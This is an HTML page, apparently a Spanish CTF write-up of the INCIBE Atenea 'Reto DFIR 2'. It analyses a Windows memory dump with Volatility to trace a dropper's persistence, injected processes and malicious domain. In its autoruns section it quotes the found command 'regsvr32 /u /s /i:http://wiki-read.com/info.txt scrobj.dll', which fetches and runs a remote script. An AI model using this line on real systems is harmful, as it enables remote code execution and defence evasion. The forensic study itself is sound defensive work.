@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>Reto DFIR 2 - Atenea Incibe</title>
+    <link rel="stylesheet" href="../../insidestyles/style.css">
+</head>
+
+<body>
+    <nav class="navbar">
+        <a href="../index.html" class="back-link">Volver</a>
+        <div class="dropdown">
+            <button class="dropbtn">Índice</button>
+            <div class="dropdown-content">
+                <a href="#section-1">Recursos</a><a href="#section-2">Contexto</a><a href="#section-3">Análisis de
+                    procesos</a><a href="#section-4">Análisis de autoruns</a><a href="#section-5">Relación con los
+                    procesos</a><a href="#section-6">Análisis de conexiónes</a><a href="#section-7">Análisis de URLs en
+                    memoria</a>
+            </div>
+        </div>
+    </nav>
+    <div class="guide-content" role="main">
+        <h1>Reto DFIR 2 - Atenea Incibe</h1>
+
+        <div class="guide-section" id="section-1">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Recursos</h2>
+                </div>
+                <div class="tool-content">
+
+                    <h3>Enlace del fichero usado</h3>
+
+
+                    <a href="https://drive.google.com/file/d/1OgjS9MtPklkL-jeiZcoj9SLAs8mFcl41/view?usp=sharing"
+                        target="_blank">Google Drive</a>
+
+
+                </div>
+            </div>
+        </div>
+
+        <div class="guide-section" id="section-2">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Contexto</h2>
+                </div>
+                <div class="tool-content">
+
+                    <h3>Información</h3>
+
+                    <p>Sospechamos que el volcado de memoria adjunto se corresponde con una máquina que ha<br>sido
+                        infectada de forma persistente por algún tipo de malware, posiblemente un dropper.<br>Nos
+                        gustaría identificar el dominio dañino utilizado por el mismo.</p>
+
+
+
+                </div>
+            </div>
+        </div>
+
+        <div class="guide-section" id="section-3">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Análisis de procesos</h2>
+                </div>
+                <div class="tool-content">
+
+                    <h3></h3>
+
+
+
+
+                    <div class="image-container align-center" style="max-width: 100%">
+                        <img src="img/20250115_191249_2025-01-15_20-12.png"
+                            alt="Aquí podemos ver algunos procesos interesantes y algunas anomalías que iremos viendo más adelante"
+                            style="width: 100%">
+                        <div class="image-caption">Aquí podemos ver algunos procesos interesantes y algunas anomalías
+                            que iremos viendo más adelante</div>
+                    </div>
+
+
+                    <h3>Identificando posibles inyecciones en los comandos</h3>
+
+                    <p>En volatility disponemos de un módulo para intentar detectar inyecciónes o comportamientos
+                        anómalos en los procesos de windows.</p>
+
+
+
+                    <h3></h3>
+
+
+
+
+                    <div class="image-container align-center" style="max-width: 100%">
+                        <img src="img/20250115_192639_Peek_2025-01-15_20-26.gif"
+                            alt="Podemos ver que encuentra posibles anomalías en los dos prodesos de Internet Explorer y en csrss"
+                            style="width: 100%">
+                        <div class="image-caption">Podemos ver que encuentra posibles anomalías en los dos prodesos de
+                            Internet Explorer y en csrss</div>
+                    </div>
+
+
+                    <h3>Análisis</h3>
+
+                    <p>En el proceso csrss.exe (PID 592):<br><br>-> Tiene una región de memoria con permisos
+                        PAGE_EXECUTE_READWRITE (que es sospechoso para csrss.exe)<br><br>-> Contiene código ensamblador
+                        que parece shellcode, con instrucciones como OUT y STD que son inusuales en código
+                        legítimo<br><br>En dos procesos de IEXPLORE.EXE (PIDs 1624 y 3728):<br><br>-> Ambos tienen
+                        regiones idénticas en la dirección 0x5fff0000<br>-> También con permisos
+                        PAGE_EXECUTE_READWRITE<br>-> Contienen la firma "dtrR" seguida de un patrón de bytes
+                        similar<br>-> El código ensamblador incluye un CALL FAR que podría ser usado para ejecución de
+                        código malicioso<br><br></p>
+
+
+
+                </div>
+            </div>
+        </div>
+
+        <div class="guide-section" id="section-4">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Análisis de autoruns</h2>
+                </div>
+                <div class="tool-content">
+
+                    <h3>Plugin autorun</h3>
+
+
+                    <a href="https://github.com/Telindus-CSIRT/volatility3-autoruns/blob/main/autorun.py"
+                        target="_blank">Github</a>
+
+
+                    <h3></h3>
+
+                    <p>Una vez importado este plugin nos permite ver que ejecutables están configurados para ejecutarse
+                        al inicio del sistema lo que es normal en la forma de generar persistencia en un malware.</p>
+
+
+
+                    <h3></h3>
+
+
+
+
+                    <div class="image-container align-center" style="max-width: 100%">
+                        <img src="img/20250115_193253_2025-01-15_20-32.png" alt="" style="width: 100%">
+
+                    </div>
+
+
+                    <h3>Análisis</h3>
+
+                    <p>La entrada más sospechosa es <br><br>regsvr32 /u /s /i:http://wiki-read.com/info.txt
+                        scrobj.dll<br><br>Este comando en el autoruns es muy sospechoso porque:<br><br>-> Usa regsvr32
+                        para desregistrar (/u) scrobj.dll<br>-> Intenta cargar un script desde una URL externa
+                        (http://wiki-read.com/info.txt)<br>-> Se ejecuta silenciosamente (/s)<br>-> Está configurado
+                        para ejecutarse automáticamente al inicio del sistema</p>
+
+
+
+                    <h3></h3>
+
+
+
+
+                    <div class="image-container align-center" style="max-width: 50%">
+                        <img src="img/20250115_193539_2025-01-15_20-35.png" alt="" style="width: 100%">
+
+                    </div>
+
+
+                    <h3></h3>
+
+                    <p>regsvr32 /s /n /i:U shell32<br><br>Este comando aparece dos veces como "_nltide_2" en RunOnce
+                        para diferentes usuarios.<br><br>Hasta ahora el posible vector inicial de infección parece ser
+                        la descarga y ejecución del script malicioso desde wiki-read.com mediante regsvr32, que es una
+                        técnica conocida de "Living off the Land" para evadir defensas.</p>
+
+
+
+                    <h3>Correlación</h3>
+
+                    <p>Esto encaja con el hallazgo anterior:<br><br>-> El script malicioso probablemente fue descargado
+                        a través de Internet Explorer<br><br>-> Inyectó código en csrss.exe (un proceso crítico del
+                        sistema)<br><br>-> Los dos procesos de IE con la misma firma indican que el malware se replicó
+                    </p>
+
+
+
+                </div>
+            </div>
+        </div>
+
+        <div class="guide-section" id="section-5">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Relación con los procesos</h2>
+                </div>
+                <div class="tool-content">
+
+                    <h3></h3>
+
+
+
+
+                    <div class="image-container align-center" style="max-width: 100%">
+                        <img src="img/20250115_194308_2025-01-15_20-43.png" alt="" style="width: 100%">
+
+                    </div>
+
+
+                    <h3>Relación</h3>
+
+                    <p>Los procesos de Internet Explorer sospechosos (PIDs 1624 y 3728) son hijos de explorer.exe (PID
+                        1868)<br><br>-> Esto es normal ya que IE se suele lanzar desde el explorador<br>-> Pero
+                        recordemos que ambos tienen la misma región de memoria maliciosa<br><br>Hay varios shells de
+                        cmd.exe abiertos (PIDs 3468, 300, 1080) también como hijos de explorer.exe<br><br>-> Esto podría
+                        indicar actividad de comando y control<br>-> Especialmente sospechoso tener múltiples shells
+                        abiertos<br><br>Hay dos instancias de explorer.exe (PIDs 1868 y 1608)<br><br>-> Una es hija de
+                        winlogon.exe (normal)<br>-> La otra (PID 1608) parece huérfana (su padre PID 1552 no
+                        existe)<br>-> Esta segunda instancia podría ser una persistencia del malware<br><br>El proceso
+                        regedit.exe (PID 2664) podría indicar modificaciones al registro<br><br>-> Esto coincide con las
+                        entradas de autoruns que encontramos antes</p>
+
+
+
+                    <h3>Línea temporal</h3>
+
+                    <p>La línea temporal sugiere:<br><br>- 23:47: Se inicia el primer IE sospechoso (PID 1624)<br>-
+                        23:49: Se modifican las entradas de autoruns (según el output anterior)<br>- 23:52: Se inicia el
+                        segundo IE sospechoso (PID 3728)</p>
+
+
+
+                </div>
+            </div>
+        </div>
+
+        <div class="guide-section" id="section-6">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Análisis de conexiónes</h2>
+                </div>
+                <div class="tool-content">
+
+                    <h3></h3>
+
+
+
+
+                    <div class="image-container align-center" style="max-width: 100%">
+                        <img src="img/20250115_195117_2025-01-15_20-50.png" alt="" style="width: 100%">
+
+                    </div>
+
+
+                    <h3>Análisis</h3>
+
+                    <p>Los procesos de IE sospechosos tienen actividad de red:<br><br>-> PID 1624 usando UDP puerto 1031
+                        en 127.0.0.1<br>-> PID 3728 usando UDP puerto 1035 en 127.0.0.1<br>-> Ambos procesos usan
+                        conexiones UDP locales, lo que es inusual para IE<br><br>Cronología interesante:<br><br>->
+                        23:47:13: Primera conexión del IE sospechoso (PID 1624)<br>-> 23:52:15: Segunda conexión del IE
+                        sospechoso (PID 3728)<br>-> Coincide con la timeline que vimos en el pstree<br><br><br>La
+                        comunicación UDP en localhost entre los procesos de IE es especialmente sospechosa y podría
+                        indicar:<br><br>- Comunicación entre componentes del malware<br>- Túnel C2 (Command &
+                        Control)<br>- Evasión de firewalls</p>
+
+
+
+                </div>
+            </div>
+        </div>
+
+        <div class="guide-section" id="section-7">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name">Análisis de URLs en memoria</h2>
+                </div>
+                <div class="tool-content">
+
+                    <h3>Datos del proceso 1624</h3>
+
+                    <p>Dado el timeline que hemos visto:<br><br>-> PID 1624 (primer IE) se inició a las 23:47:12<br>->
+                        Las modificaciones del registro ocurrieron a las 23:49<br>-> PID 3728 (segundo IE) se inició
+                        después a las 23:52:15<br><br>El PID 1624 parece ser la infección inicial que desencadenó todo,
+                        así que es el mejor candidato para buscar la URL maliciosa.</p>
+
+
+                    <div class="image-container align-center" style="max-width: 100%">
+                        <img src="img/20250115_195422_2025-01-15_20-54.png"
+                            alt="Lo volcamos en un txt por si es mucho contenido " style="width: 100%">
+                        <div class="image-caption">Lo volcamos en un txt por si es mucho contenido </div>
+                    </div>
+
+
+                    <h3></h3>
+
+
+
+
+                    <div class="image-container align-center" style="max-width: 100%">
+                        <img src="img/20250115_200501_2025-01-15_21-04.png" alt="" style="width: 100%">
+
+                    </div>
+
+
+
+                </div>
+            </div>
+        </div>
+
+    </div>
+    <footer class="guide-footer">
+        &copy; 2025 Labs & CTFs
+    </footer>
+</body>
+
+</html>
